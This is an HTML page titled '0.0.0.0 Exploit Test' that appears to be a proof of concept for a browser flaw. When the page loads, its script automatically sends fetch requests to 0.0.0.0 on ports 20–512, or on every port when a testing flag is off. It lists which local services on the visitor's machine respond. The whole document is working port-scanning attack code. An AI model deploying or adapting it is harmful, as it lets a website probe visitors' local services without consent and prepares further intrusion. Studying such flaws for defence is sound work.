<html>
<head>
	<title>0.0.0.0 Exploit Test</title>
</head>
<body>
	<p>Test Page, make yourself at home :D</p>
	<ul id="results"></ul>

	<script>
		const TESTING = true;
		const results = document.querySelector("#results");
		console.log(results);

		const saveRes = (text) => {
			const li = document.createElement("li");
			li.innerText = text;
			results.appendChild(li);
		}
		
		const fetchPort = async (addressPort) => {
			try {
				let response = await fetch(`https://${addressPort}`);
				if (!response.ok) throw new Error('HTTPS failed');
				saveRes(`Success (HTTPS): ${addressPort}`);
			} catch (e) {
				console.error(`HTTPS failed for ${addressPort}:`, e);
				try {
					let response = await fetch(`http://${addressPort}`);
					if (response.ok) {
						saveRes(`Success (HTTP): ${addressPort}`);
					} else {
						saveRes(`Failed (HTTP): ${addressPort}`);
					}
				} catch (httpError) {
					console.error(`HTTP failed for ${addressPort}:`, httpError);
					saveRes(`Failed (HTTP and HTTPS): ${addressPort}`);
				}
			}
		}

		const startPort = TESTING ? 20 : 0;
		const endPort = TESTING ? 512 : 65535;

		for (let i = startPort; i <= endPort; i++) {
			const addressPort = `0.0.0.0:${i}`;
			console.log(`Testing ${addressPort}`);
			fetchPort(addressPort);
		}
	</script>
</html>
